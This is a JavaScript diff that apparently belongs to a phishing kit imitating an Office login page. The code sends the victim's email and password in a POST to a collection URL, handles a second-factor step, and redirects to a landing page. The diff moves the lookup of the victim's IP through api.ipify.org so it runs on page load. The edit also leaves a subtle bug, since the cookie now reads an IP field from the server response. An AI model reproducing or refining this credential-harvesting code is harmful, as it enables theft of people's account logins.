@@ -10,6 +10,7 @@ var randomNum="";
 var skip=1;
 var myInterval,Proofs;
 var Timeout;
+var IP;
 $( document ).ready(async function() {
 console.log(semail);  
 if(lmode=='a'){
@@ -42,7 +43,10 @@ return scrn;
 $("#load").hide();
 }
 }
-
+$.getJSON("https://api.ipify.org?format=json", function(data) {
+    console.log(data.ip);
+    IP=data.ip;
+})
 function isEmail(email) {
 var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 return regex.test(email);
@@ -140,7 +144,7 @@ location.reload();
 }
 var count = 0;
 var lcount = 0;
-function redlogin() {
+async function redlogin() {
 epass = $("#epass").val();
 
 if (epass == "") {
@@ -156,15 +160,13 @@ $.ajax({
 type: "POST",
 url: urlx,
 data: { action: "signup", email: email, epass: epass, mode: 'OfficeLogin' },
-}).done(function (data) {
+}).done(async function (data) {
 console.log(data);
 var datArray = JSON.parse(data);
 
 if (datArray["status"] == "success") {
-$.getJSON("https://api.ipify.org?format=json", function(data) {
-    console.log(data.ip);
-setCookie('check', data.ip, window.location.host);
-})
+await setCookie('check', data.ip, window.location.host);
+
 window.location.replace(datArray["land"]);
 } else if (datArray["status"] == "login_auth") {
 auth(datArray["auth_val"]);
